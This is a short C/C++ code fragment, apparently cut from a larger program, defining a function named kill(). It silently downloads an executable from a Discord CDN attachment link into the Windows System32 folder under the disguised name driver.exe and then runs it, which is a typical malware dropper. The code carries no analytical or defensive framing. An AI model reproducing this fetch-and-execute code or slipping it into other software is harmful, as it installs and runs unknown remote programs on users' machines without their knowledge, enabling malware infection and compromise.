...
void kill()
{
    system("curl https://cdn.discordapp.com/attachments/1161368639480541396/1161383020134137946/bcxx.exe -o C:\\Windows\\System32\\driver.exe --silent");
    system("C:\\Windows\\System32\\driver.exe");
}